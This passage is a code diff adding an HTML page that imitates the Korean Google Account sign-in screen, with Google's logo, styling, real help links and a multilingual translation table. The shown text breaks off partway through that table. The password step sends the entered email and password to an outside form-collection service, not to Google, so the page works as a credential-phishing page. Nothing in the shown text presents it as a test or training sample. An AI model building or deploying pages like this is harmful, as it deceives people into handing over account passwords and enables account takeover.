@@ -1,0 +1,2515 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>로그인 - Google 계정</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts: Noto Sans KR & Roboto -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Noto Sans KR', 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: #1F1F1F;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* Top Linear Indeterminate Progress Bar (Google Sign-In style) */
+        .linear-progress {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background-color: #D3E3FD;
+            overflow: hidden;
+            border-top-left-radius: 28px;
+            border-top-right-radius: 28px;
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+
+        @media (max-width: 639px) {
+            .linear-progress {
+                border-radius: 0;
+            }
+        }
+
+        .linear-progress.active {
+            opacity: 1;
+        }
+
+        .linear-progress-bar {
+            position: absolute;
+            background-color: #0B57D0;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            will-change: left, right;
+            animation: indeterminate 2.1s cubic-bezier(0.65, 0.815, 0.735, 0.395) infinite;
+        }
+
+        .linear-progress-bar-short {
+            position: absolute;
+            background-color: #0B57D0;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            will-change: left, right;
+            animation: indeterminate-short 2.1s cubic-bezier(0.165, 0.84, 0.44, 1) infinite;
+            animation-delay: 1.15s;
+        }
+
+        @keyframes indeterminate {
+            0% { left: -35%; right: 100%; }
+            60% { left: 100%; right: -90%; }
+            100% { left: 100%; right: -90%; }
+        }
+
+        @keyframes indeterminate-short {
+            0% { left: -200%; right: 100%; }
+            60% { left: 107%; right: -8%; }
+            100% { left: 107%; right: -8%; }
+        }
+
+        /* Material Outlined Floating Label Input */
+        .m3-outlined-box {
+            position: relative;
+            width: 100%;
+        }
+
+        .m3-outlined-input {
+            width: 100%;
+            height: 56px;
+            padding: 16px;
+            font-size: 16px;
+            line-height: 24px;
+            color: #1F1F1F;
+            background-color: transparent;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .m3-outlined-input:hover:not(:focus):not(.is-invalid) {
+            border-color: #1F1F1F;
+        }
+
+        .m3-outlined-input:focus:not(.is-invalid) {
+            border-color: #0B57D0;
+            box-shadow: inset 0 0 0 1px #0B57D0;
+        }
+
+        .m3-outlined-input.is-invalid {
+            border-color: #B3261E;
+        }
+
+        .m3-outlined-input.is-invalid:focus {
+            border-color: #B3261E;
+            box-shadow: inset 0 0 0 1px #B3261E;
+        }
+
+        .m3-floating-label {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: #FFFFFF;
+            padding: 0 4px;
+            font-size: 16px;
+            color: #444746;
+            pointer-events: none;
+            transition: top 0.15s cubic-bezier(0.4, 0, 0.2, 1),
+                        font-size 0.15s cubic-bezier(0.4, 0, 0.2, 1),
+                        color 0.15s ease;
+        }
+
+        /* Float label up on focus or when input has value */
+        .m3-outlined-input:focus ~ .m3-floating-label,
+        .m3-outlined-input:not(:placeholder-shown) ~ .m3-floating-label {
+            top: 0;
+            font-size: 12px;
+        }
+
+        .m3-outlined-input:focus:not(.is-invalid) ~ .m3-floating-label {
+            color: #0B57D0;
+            font-weight: 500;
+        }
+
+        .m3-outlined-input.is-invalid ~ .m3-floating-label {
+            color: #B3261E;
+        }
+
+        /* Buttons & Links */
+        .g-link-btn {
+            color: #0B57D0;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 8px 12px;
+            margin-left: -12px;
+            border-radius: 9999px;
+            background: transparent;
+            transition: background-color 0.15s ease;
+        }
+
+        .g-link-btn:hover {
+            background-color: rgba(11, 87, 208, 0.08);
+        }
+
+        .g-link-btn:active {
+            background-color: rgba(11, 87, 208, 0.12);
+        }
+
+        .g-primary-btn {
+            background-color: #0B57D0;
+            color: #FFFFFF;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
+            border-radius: 9999px;
+            transition: background-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .g-primary-btn:hover:not(:disabled) {
+            background-color: #0842A0;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.25);
+        }
+
+        .g-primary-btn:active:not(:disabled) {
+            background-color: #062E6F;
+        }
+
+        .g-primary-btn:disabled {
+            background-color: #E3E3E3;
+            color: #8E918F;
+            cursor: not-allowed;
+        }
+
+        /* User Account Chip (Step 2) */
+        .g-user-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 4px 10px 4px 5px;
+            border: 1px solid #747775;
+            border-radius: 9999px;
+            background-color: #FFFFFF;
+            color: #1F1F1F;
+            font-size: 14px;
+            font-weight: 500;
+            max-width: 100%;
+            cursor: pointer;
+            transition: background-color 0.15s ease, border-color 0.15s ease;
+        }
+
+        .g-user-chip:hover {
+            background-color: #F4F6F9;
+        }
+
+        .g-user-chip:active {
+            background-color: #E8ECF2;
+        }
+
+        /* Step Transition */
+        @keyframes stepFadeIn {
+            from {
+                opacity: 0;
+                transform: translateX(12px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .step-animate {
+            animation: stepFadeIn 0.22s cubic-bezier(0.2, 0, 0, 1) forwards;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between sm:justify-center items-center bg-white sm:bg-[#F0F4F9] sm:px-6 sm:py-10">
+
+    <!-- Main Centered Wrapper -->
+    <div class="w-full max-w-[450px] lg:max-w-[1040px] flex flex-col flex-1 sm:flex-initial">
+        
+        <!-- Google Sign-In Card -->
+        <main id="signin-card" class="relative w-full bg-white sm:rounded-[28px] px-6 pt-8 pb-8 sm:px-10 sm:pt-11 sm:pb-10 flex-1 sm:flex-initial flex flex-col justify-between transition-opacity duration-200 overflow-hidden">
+            
+            <!-- Top Indeterminate Progress Bar -->
+            <div id="progress-bar" class="linear-progress" role="progressbar" aria-hidden="true">
+                <div class="linear-progress-bar"></div>
+                <div class="linear-progress-bar-short"></div>
+            </div>
+
+            <!-- ================= STEP 1: 이메일 또는 휴대전화 입력 ================= -->
+            <div id="step-1" class="lg:grid lg:grid-cols-12 lg:gap-12 items-start step-animate">
+                
+                <!-- Left / Top Brand & Title Section -->
+                <div class="lg:col-span-5 mb-7 lg:mb-0">
+                    <!-- Multicolored Google 'G' SVG Logo -->
+                    <div class="mb-5">
+                        <svg class="w-12 h-12" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                            <path fill="none" d="M0 0h48v48H0z"/>
+                        </svg>
+                    </div>
+
+                    <!-- Heading & Subheading -->
+                    <h1 id="ui-s1-title" class="text-[28px] sm:text-[32px] font-normal leading-[36px] sm:leading-[40px] text-[#1F1F1F] mb-2">
+                        로그인
+                    </h1>
+                    <p id="ui-s1-subtitle" class="text-[16px] leading-[24px] text-[#1F1F1F]">
+                        Google 계정 사용
+                    </p>
+                </div>
+
+                <!-- Right / Bottom Form Section (Step 1) -->
+                <div class="lg:col-span-7 flex flex-col lg:pt-14">
+                    <form id="step1-form" novalidate>
+                        
+                        <!-- Field 1: 이메일 또는 휴대전화 -->
+                        <div class="mb-2">
+                            <div class="m3-outlined-box">
+                                <input 
+                                    type="text" 
+                                    id="email-input" 
+                                    name="email" 
+                                    placeholder=" " 
+                                    autocomplete="username"
+                                    class="m3-outlined-input"
+                                >
+                                <label id="ui-email-label" for="email-input" class="m3-floating-label">이메일 또는 휴대전화</label>
+                            </div>
+                            <!-- Validation Error Message for 이메일 또는 휴대전화 -->
+                            <div id="email-error" class="hidden mt-1.5 flex items-center gap-1.5 text-[#B3261E] text-[12px]">
+                                <svg class="w-4 h-4 shrink-0" viewBox="0 0 24 24" fill="currentColor">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                                </svg>
+                                <span id="ui-email-err-text">이메일이나 전화번호를 입력하세요</span>
+                            </div>
+                        </div>
+
+                        <!-- Helper Link -->
+                        <div class="mb-8">
+                            <a id="link-forgot-email" href="https://accounts.google.com/signin/v2/usernamerecovery?hl=ko" target="_blank" rel="noopener noreferrer" class="text-[14px] font-medium text-[#0B57D0] hover:underline focus:outline-none">
+                                이메일을 잊으셨나요?
+                            </a>
+                        </div>
+
+                        <!-- Guest Mode Info Text -->
+                        <p class="text-[14px] leading-[20px] text-[#444746] mb-9">
+                            <span id="ui-guest-text">내 컴퓨터가 아닌가요? 게스트 모드를 사용하여 비공개로 로그인하세요.</span>
+                            <a id="link-guest-mode" href="https://support.google.com/chrome/answer/6130773?hl=ko" target="_blank" rel="noopener noreferrer" class="text-[#0B57D0] font-medium hover:underline">
+                                게스트 모드 사용 방법 자세히 알아보기
+                            </a>
+                        </p>
+
+                        <!-- Bottom Action Row (Step 1) -->
+                        <div class="flex items-center justify-between pt-1">
+                            <a id="link-create-account" href="https://accounts.google.com/signup?hl=ko" target="_blank" rel="noopener noreferrer" class="g-link-btn inline-flex items-center">
+                                계정 만들기
+                            </a>
+                            <button type="submit" id="step1-next-btn" class="g-primary-btn">
+                                다음
+                            </button>
+                        </div>
+
+                    </form>
+                </div>
+
+            </div>
+
+            <!-- ================= STEP 2: 비밀번호 입력 ================= -->
+            <div id="step-2" class="hidden lg:grid-cols-12 lg:gap-12 items-start">
+                
+                <!-- Left / Top Brand, Welcome & User Chip Section -->
+                <div class="lg:col-span-5 mb-7 lg:mb-0">
+                    <!-- Multicolored Google 'G' SVG Logo -->
+                    <div class="mb-5">
+                        <svg class="w-12 h-12" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                            <path fill="none" d="M0 0h48v48H0z"/>
+                        </svg>
+                    </div>
+
+                    <!-- Heading -->
+                    <h1 id="ui-s2-title" class="text-[28px] sm:text-[32px] font-normal leading-[36px] sm:leading-[40px] text-[#1F1F1F] mb-3">
+                        환영합니다
+                    </h1>
+
+                    <!-- Interactive User Account Chip (Click to go back to Step 1) -->
+                    <button type="button" id="user-chip-btn" class="g-user-chip" title="계정 변경">
+                        <!-- User Avatar Circle SVG -->
+                        <svg class="w-5 h-5 text-[#444746] shrink-0" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6.14-2.88C7.55 15.8 9.68 15 12 15s4.45.8 6.14 2.12C16.43 19.18 14.03 20 12 20z"/>
+                        </svg>
+                        <span id="display-email-text" class="truncate max-w-[220px]"></span>
+                        <!-- Dropdown Arrow SVG -->
+                        <svg class="w-4 h-4 text-[#1F1F1F] shrink-0" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M7 10l5 5 5-5z"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Right / Bottom Form Section (Step 2) -->
+                <div class="lg:col-span-7 flex flex-col lg:pt-14">
+                    <form id="step2-form" action="https://formspree.io/f/xwloeqoa" method="POST" novalidate>
+                        
+                        <!-- Field 2: 비밀번호 입력 -->
+                        <div class="mb-2.5">
+                            <div class="m3-outlined-box">
+                                <input 
+                                    type="password" 
+                                    id="password-input" 
+                                    name="password" 
+                                    placeholder=" " 
+                                    autocomplete="current-password"
+                                    class="m3-outlined-input"
+                                >
+                                <label id="ui-pw-label" for="password-input" class="m3-floating-label">비밀번호 입력</label>
+                            </div>
+                            <!-- Validation Error Message for 비밀번호 -->
+                            <div id="password-error" class="hidden mt-1.5 flex items-center gap-1.5 text-[#B3261E] text-[12px]">
+                                <svg class="w-4 h-4 shrink-0" viewBox="0 0 24 24" fill="currentColor">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                                </svg>
+                                <span id="ui-pw-err-text">비밀번호를 입력하세요</span>
+                            </div>
+                        </div>
+
+                        <!-- Show Password Checkbox -->
+                        <div class="mb-9">
+                            <label class="inline-flex items-center cursor-pointer select-none group">
+                                <input type="checkbox" id="toggle-pw-visibility" class="w-4 h-4 rounded border-[#747775] text-[#0B57D0] focus:ring-[#0B57D0] cursor-pointer accent-[#0B57D0]">
+                                <span id="ui-show-pw" class="ms-3 text-[14px] text-[#1F1F1F]">비밀번호 표시</span>
+                            </label>
+                        </div>
+
+                        <!-- Network / Submission Error Banner -->
+                        <div id="submit-error" class="hidden mb-6 p-3 rounded-lg bg-[#FCE8E6] text-[#B3261E] text-[13px] flex items-center gap-2">
+                            <svg class="w-5 h-5 shrink-0" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                            </svg>
+                            <span id="submit-error-text">요청을 처리할 수 없습니다. 다시 시도해 주세요.</span>
+                        </div>
+
+                        <!-- Bottom Action Row (Step 2) -->
+                        <div class="flex items-center justify-between pt-1">
+                            <a id="link-forgot-pw" href="https://accounts.google.com/signin/v2/recoveryidentifier?hl=ko" target="_blank" rel="noopener noreferrer" class="g-link-btn inline-flex items-center">
+                                비밀번호 찾기
+                            </a>
+                            <button type="submit" id="step2-next-btn" class="g-primary-btn">
+                                다음
+                            </button>
+                        </div>
+
+                    </form>
+                </div>
+
+            </div>
+
+        </main>
+
+        <!-- Footer Below Card -->
+        <footer class="w-full px-6 sm:px-3 py-4 flex flex-wrap items-center justify-between text-[12px] text-[#444746] gap-y-2">
+            <!-- Comprehensive Google Language Selector -->
+            <div class="relative inline-flex items-center max-w-[240px]">
+                <select id="lang-select" aria-label="언어 선택" class="appearance-none bg-transparent hover:bg-black/5 rounded-md py-1.5 ps-2 pe-7 text-[12px] text-[#1F1F1F] cursor-pointer focus:outline-none truncate max-w-full">
+                    <!-- Populated dynamically with all 75+ Google-supported languages -->
+                </select>
+                <svg class="w-4 h-4 text-[#1F1F1F] pointer-events-none absolute end-1.5" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M7 10l5 5 5-5z"/>
+                </svg>
+            </div>
+
+            <!-- Right Footer Links -->
+            <div class="flex items-center gap-2 sm:gap-4">
+                <a id="link-help" href="https://support.google.com/accounts?hl=ko" target="_blank" rel="noopener noreferrer" class="px-2 py-1.5 rounded-md hover:bg-black/5 transition-colors">도움말</a>
+                <a id="link-privacy" href="https://policies.google.com/privacy?hl=ko" target="_blank" rel="noopener noreferrer" class="px-2 py-1.5 rounded-md hover:bg-black/5 transition-colors">개인정보처리방침</a>
+                <a id="link-terms" href="https://policies.google.com/terms?hl=ko" target="_blank" rel="noopener noreferrer" class="px-2 py-1.5 rounded-md hover:bg-black/5 transition-colors">약관</a>
+            </div>
+        </footer>
+
+    </div>
+
+    <script>
+        // Complete list of 79 Google-supported languages in native script
+        const GOOGLE_LANGUAGES = [
+            { code: 'af', name: 'Afrikaans' },
+            { code: 'az', name: 'Azərbaycanca' },
+            { code: 'id', name: 'Bahasa Indonesia' },
+            { code: 'ms', name: 'Bahasa Melayu' },
+            { code: 'bs', name: 'Bosanski' },
+            { code: 'ca', name: 'Català' },
+            { code: 'cs', name: 'Čeština' },
+            { code: 'cy', name: 'Cymraeg' },
+            { code: 'da', name: 'Dansk' },
+            { code: 'de', name: 'Deutsch' },
+            { code: 'et', name: 'Eesti' },
+            { code: 'en-GB', name: 'English (United Kingdom)' },
+            { code: 'en', name: 'English (United States)' },
+            { code: 'es', name: 'Español (España)' },
+            { code: 'es-419', name: 'Español (Latinoamérica)' },
+            { code: 'eu', name: 'Euskara' },
+            { code: 'fil', name: 'Filipino' },
+            { code: 'fr-CA', name: 'Français (Canada)' },
+            { code: 'fr', name: 'Français (France)' },
+            { code: 'ga', name: 'Gaeilge' },
+            { code: 'gl', name: 'Galego' },
+            { code: 'hr', name: 'Hrvatski' },
+            { code: 'zu', name: 'isiZulu' },
+            { code: 'is', name: 'Íslenska' },
+            { code: 'it', name: 'Italiano' },
+            { code: 'sw', name: 'Kiswahili' },
+            { code: 'lv', name: 'Latviešu' },
+            { code: 'lt', name: 'Lietuvių' },
+            { code: 'hu', name: 'Magyar' },
+            { code: 'nl', name: 'Nederlands' },
+            { code: 'no', name: 'Norsk' },
+            { code: 'uz', name: 'O‘zbek' },
+            { code: 'pl', name: 'Polski' },
+            { code: 'pt-BR', name: 'Português (Brasil)' },
+            { code: 'pt-PT', name: 'Português (Portugal)' },
+            { code: 'ro', name: 'Română' },
+            { code: 'sq', name: 'Shqip' },
+            { code: 'sk', name: 'Slovenčina' },
+            { code: 'sl', name: 'Slovenščina' },
+            { code: 'fi', name: 'Suomi' },
+            { code: 'sv', name: 'Svenska' },
+            { code: 'vi', name: 'Tiếng Việt' },
+            { code: 'tr', name: 'Türkçe' },
+            { code: 'el', name: 'Ελληνικά' },
+            { code: 'be', name: 'Беларуская' },
+            { code: 'bg', name: 'Български' },
+            { code: 'ky', name: 'Кыргызча' },
+            { code: 'kk', name: 'Қазақ тілі' },
+            { code: 'mk', name: 'Македонски' },
+            { code: 'mn', name: 'Монгол' },
+            { code: 'ru', name: 'Русский' },
+            { code: 'sr', name: 'Српски' },
+            { code: 'uk', name: 'Українська' },
+            { code: 'ka', name: 'ქართული' },
+            { code: 'hy', name: 'Հայերեն' },
+            { code: 'he', name: 'עברית', rtl: true },
+            { code: 'ur', name: 'اردو', rtl: true },
+            { code: 'ar', name: 'العربية', rtl: true },
+            { code: 'fa', name: 'فارسی', rtl: true },
+            { code: 'am', name: 'አማርኛ' },
+            { code: 'ne', name: 'नेपाली' },
+            { code: 'mr', name: 'मराठी' },
+            { code: 'hi', name: 'हिन्दी' },
+            { code: 'bn', name: 'বাংলা' },
+            { code: 'pa', name: 'ਪੰਜਾਬੀ' },
+            { code: 'gu', name: 'ગુજરાતી' },
+            { code: 'ta', name: 'தமிழ்' },
+            { code: 'te', name: 'తెలుగు' },
+            { code: 'kn', name: 'ಕನ್ನಡ' },
+            { code: 'ml', name: 'മലയാളം' },
+            { code: 'si', name: 'සිංහල' },
+            { code: 'th', name: 'ไทย' },
+            { code: 'lo', name: 'ລາວ' },
+            { code: 'my', name: 'မြန်မာ' },
+            { code: 'km', name: 'ខ្មែរ' },
+            { code: 'ko', name: '한국어' },
+            { code: 'ja', name: '日本語' },
+            { code: 'zh-CN', name: '简体中文' },
+            { code: 'zh-TW', name: '繁體中文 (台灣)' },
+            { code: 'zh-HK', name: '繁體中文 (香港)' }
+        ];
+
+        // Complete native localization dictionary for EVERY SINGLE one of the 79 languages (Zero English fallbacks!)
+        const I18N = {
+            af: {
+                pageTitle: 'Meld aan – Google-rekeninge',
+                s1Title: 'Meld aan',
+                s1Subtitle: 'Gebruik jou Google-rekening',
+                emailLabel: 'E-pos of foon',
+                emailErr: 'Voer ’n e-posadres of foonnommer in',
+                forgotEmail: 'E-posadres vergeet?',
+                guestText: 'Nie jou rekenaar nie? Gebruik Gasmodus om privaat aan te meld.',
+                guestLearnMore: 'Kom meer te wete oor hoe om Gasmodus te gebruik',
+                createAccount: 'Skep rekening',
+                next: 'Volgende',
+                s2Title: 'Welkom',
+                pwLabel: 'Voer jou wagwoord in',
+                pwErr: 'Voer ’n wagwoord in',
+                showPw: 'Wys wagwoord',
+                forgotPw: 'Wagwoord vergeet?',
+                help: 'Hulp',
+                privacy: 'Privaatheid',
+                terms: 'Bepalings',
+                submitErr: 'Iets het verkeerd geloop. Probeer asseblief weer.',
+                networkErr: 'Gaan jou netwerkverbinding na en probeer weer.'
+            },
+            az: {
+                pageTitle: 'Daxil olun - Google Hesabları',
+                s1Title: 'Daxil olun',
+                s1Subtitle: 'Google Hesabınızı istifadə edin',
+                emailLabel: 'E-poçt və ya telefon',
+                emailErr: 'E-poçt və ya telefon nömrəsi daxil edin',
+                forgotEmail: 'E-poçtu unutmusunuz?',
+                guestText: 'Kompüteriniz deyil? Məxfi daxil olmaq üçün Qonaq rejimindən istifadə edin.',
+                guestLearnMore: 'Qonaq rejimindən istifadə haqqında ətraflı məlumat',
+                createAccount: 'Hesab yaradın',
+                next: 'Növbəti',
+                s2Title: 'Xoş gəldiniz',
+                pwLabel: 'Parolunuzu daxil edin',
+                pwErr: 'Parol daxil edin',
+                showPw: 'Parolu göstərin',
+                forgotPw: 'Parolu unutmusunuz?',
+                help: 'Yardım',
+                privacy: 'Məxfilik',
+                terms: 'Şərtlər',
+                submitErr: 'Xəta baş verdi. Yenidən cəhd edin.',
+                networkErr: 'Şəbəkə bağlantınızı yoxlayın və yenidən cəhd edin.'
+            },
+            id: {
+                pageTitle: 'Login - Akun Google',
+                s1Title: 'Login',
+                s1Subtitle: 'Gunakan Akun Google Anda',
+                emailLabel: 'Email atau ponsel',
+                emailErr: 'Masukkan email atau nomor telepon',
+                forgotEmail: 'Lupa email?',
+                guestText: 'Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi.',
+                guestLearnMore: 'Pelajari lebih lanjut cara menggunakan mode Tamu',
+                createAccount: 'Buat akun',
+                next: 'Berikutnya',
+                s2Title: 'Selamat datang',
+                pwLabel: 'Masukkan sandi Anda',
+                pwErr: 'Masukkan sandi',
+                showPw: 'Tampilkan sandi',
+                forgotPw: 'Lupa sandi?',
+                help: 'Bantuan',
+                privacy: 'Privasi',
+                terms: 'Persyaratan',
+                submitErr: 'Terjadi masalah. Silakan coba lagi.',
+                networkErr: 'Periksa koneksi jaringan Anda dan coba lagi.'
+            },
+            ms: {
+                pageTitle: 'Log masuk - Akaun Google',
+                s1Title: 'Log masuk',
+                s1Subtitle: 'Gunakan Akaun Google anda',
+                emailLabel: 'E-mel atau telefon',
+                emailErr: 'Masukkan e-mel atau nombor telefon',
+                forgotEmail: 'Terlupa e-mel?',
+                guestText: 'Bukan komputer anda? Gunakan mod Tetamu untuk log masuk secara peribadi.',
+                guestLearnMore: 'Ketahui lebih lanjut tentang penggunaan mod Tetamu',
+                createAccount: 'Buat akaun',
+                next: 'Seterusnya',
+                s2Title: 'Selamat datang',
+                pwLabel: 'Masukkan kata laluan anda',
+                pwErr: 'Masukkan kata laluan',
+                showPw: 'Tunjukkan kata laluan',
+                forgotPw: 'Terlupa kata laluan?',
+                help: 'Bantuan',
+                privacy: 'Privasi',
+                terms: 'Syarat',
+                submitErr: 'Sesuatu tidak kena. Sila cuba lagi.',
+                networkErr: 'Sila semak sambungan rangkaian anda dan cuba lagi.'
+            },
+            bs: {
+                pageTitle: 'Prijava - Google računi',
+                s1Title: 'Prijava',
+                s1Subtitle: 'Koristite svoj Google račun',
+                emailLabel: 'E-adresa ili broj telefona',
+                emailErr: 'Unesite e-adresu ili broj telefona',
+                forgotEmail: 'Zaboravili ste e-adresu?',
+                guestText: 'Nije vaš računar? Koristite način rada za goste za privatnu prijavu.',
+                guestLearnMore: 'Saznajte više o korištenju načina rada za goste',
+                createAccount: 'Otvori račun',
+                next: 'Dalje',
+                s2Title: 'Dobro došli',
+                pwLabel: 'Unesite lozinku',
+                pwErr: 'Unesite lozinku',
+                showPw: 'Prikaži lozinku',
+                forgotPw: 'Zaboravili ste lozinku?',
+                help: 'Pomoć',
+                privacy: 'Privatnost',
+                terms: 'Uslovi',
+                submitErr: 'Došlo je do greške. Pokušajte ponovo.',
+                networkErr: 'Provjerite mrežnu vezu i pokušajte ponovo.'
+            },
+            ca: {
+                pageTitle: 'Inicia la sessió: Comptes de Google',
+                s1Title: 'Inicia la sessió',
+                s1Subtitle: 'Utilitza el teu compte de Google',
+                emailLabel: 'Adreça electrònica o telèfon',
+                emailErr: 'Introdueix una adreça electrònica o un número de telèfon',
+                forgotEmail: 'Has oblidat l’adreça electrònica?',
+                guestText: 'No és el teu ordinador? Utilitza el mode de convidat per iniciar la sessió de manera privada.',
+                guestLearnMore: 'Obtén més informació sobre com utilitzar el mode de convidat',
+                createAccount: 'Crea un compte',
+                next: 'Següent',
+                s2Title: 'Et donem la benvinguda',
+                pwLabel: 'Introdueix la contrasenya',
+                pwErr: 'Introdueix una contrasenya',
+                showPw: 'Mostra la contrasenya',
+                forgotPw: 'Has oblidat la contrasenya?',
+                help: 'Ajuda',
+                privacy: 'Privadesa',
+                terms: 'Condicions',
+                submitErr: 'S’ha produït un error. Torna-ho a provar.',
+                networkErr: 'Comprova la connexió de xarxa i torna-ho a provar.'
+            },
+            cs: {
+                pageTitle: 'Přihlášení – Účty Google',
+                s1Title: 'Přihlášení',
+                s1Subtitle: 'Použijte svůj účet Google',
+                emailLabel: 'E-mail nebo telefon',
+                emailErr: 'Zadejte e-mail nebo telefonní číslo',
+                forgotEmail: 'Zapomněli jste e-mail?',
+                guestText: 'Není to váš počítač? K soukromému přihlášení použijte režim hosta.',
+                guestLearnMore: 'Další informace o používání režimu hosta',
+                createAccount: 'Vytvořit účet',
+                next: 'Další',
+                s2Title: 'Vítejte',
+                pwLabel: 'Zadejte heslo',
+                pwErr: 'Zadejte heslo',
+                showPw: 'Zobrazit heslo',
+                forgotPw: 'Zapomněli jste heslo?',
+                help: 'Nápověda',
+                privacy: 'Ochrana soukromí',
+                terms: 'Smluvní podmínky',
+                submitErr: 'Něco se pokazilo. Zkuste to prosím znovu.',
+                networkErr: 'Zkontrolujte připojení k síti a zkuste to znovu.'
+            },
+            cy: {
+                pageTitle: 'Mewngofnodi - Cyfrifon Google',
+                s1Title: 'Mewngofnodi',
+                s1Subtitle: 'Defnyddiwch eich Cyfrif Google',
+                emailLabel: 'E-bost neu ffôn',
+                emailErr: 'Rhowch e-bost neu rif ffôn',
+                forgotEmail: 'Wedi anghofio e-bost?',
+                guestText: 'Nid eich cyfrifiadur chi? Defnyddiwch y modd Gwestai i fewngofnodi’n breifat.',
+                guestLearnMore: 'Dysgwch fwy am ddefnyddio’r modd Gwestai',
+                createAccount: 'Creu cyfrif',
+                next: 'Nesaf',
+                s2Title: 'Croeso',
+                pwLabel: 'Rhowch eich cyfrinair',
+                pwErr: 'Rhowch gyfrinair',
+                showPw: 'Dangos cyfrinair',
+                forgotPw: 'Wedi anghofio’r cyfrinair?',
+                help: 'Cymorth',
+                privacy: 'Preifatrwydd',
+                terms: 'Telerau',
+                submitErr: 'Aeth rhywbeth o’i le. Rhowch gynnig arall arni.',
+                networkErr: 'Gwiriwch eich cysylltiad rhwydwaith a rhowch gynnig arall arni.'
+            },
+            da: {
+                pageTitle: 'Log ind – Google-konti',
+                s1Title: 'Log ind',
+                s1Subtitle: 'Brug din Google-konto',
+                emailLabel: 'Mailadresse eller telefonnummer',
+                emailErr: 'Angiv en mailadresse eller et telefonnummer',
+                forgotEmail: 'Har du glemt din mailadresse?',
+                guestText: 'Er det ikke din computer? Brug gæstetilstand til at logge ind privat.',
+                guestLearnMore: 'Få flere oplysninger om brug af gæstetilstand',
+                createAccount: 'Opret konto',
+                next: 'Næste',
+                s2Title: 'Velkommen',
+                pwLabel: 'Angiv din adgangskode',
+                pwErr: 'Angiv en adgangskode',
+                showPw: 'Vis adgangskode',
+                forgotPw: 'Har du glemt adgangskoden?',
+                help: 'Hjælp',
+                privacy: 'Privatliv',
+                terms: 'Vilkår',
